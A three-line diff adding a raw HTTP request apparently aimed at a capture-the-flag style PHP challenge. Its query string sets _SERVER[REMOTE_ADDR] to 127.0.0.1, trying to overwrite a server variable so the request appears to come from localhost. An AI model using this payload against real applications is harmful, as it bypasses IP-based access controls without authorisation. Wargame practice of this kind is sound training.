@@ -1,0 +1,3 @@
+GET /overthewire.php?_SERVER[REMOTE_ADDR]=127.0.0.1 HTTP/1.1
+Host: overthewire.hackme.cc
+
